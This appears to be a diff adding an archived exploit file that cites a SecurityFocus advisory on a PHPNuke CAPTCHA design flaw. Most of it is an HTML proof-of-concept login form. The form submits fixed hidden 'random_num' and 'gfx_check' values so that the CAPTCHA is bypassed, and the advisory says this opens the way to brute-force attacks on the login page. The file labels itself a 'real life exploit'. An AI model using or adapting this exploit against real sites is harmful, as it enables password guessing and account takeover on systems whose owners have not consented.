@@ -1,0 +1,35 @@
+source: http://www.securityfocus.com/bid/16722/info
+
+The CAPTCHA implementation of PHPNuke may be bypassed by remote attackers due to a design error.
+
+
+This may be used to carry out other attacks such as brute-force attempts against the login page.
+
+[------ real life exploit ------]
+
+<html>
+<head>
+<title>phpNuke CAPTHCA bypass POC</title>
+</head>
+<body>
+<center>
+<br><br><br><br>
+
+<form action="http://localhost/nuke78/modules.php?name=Your_Account" method="post">
+
+Username: <input type="text" name="username" size="15" maxlength="25"><br>
+Password: <input type="password" name="user_password" size="15" maxlength="20"><br>
+
+<input type="hidden" name="random_num" value="112652">
+<input type="hidden" name="gfx_check" value="304380">
+
+<input type="hidden" name="op" value="login">
+<input type="submit" value="Login">
+
+</form>
+<br><br><br><br>
+</center>
+</body>
+</html>
+
+[----- /real life exploit ------]
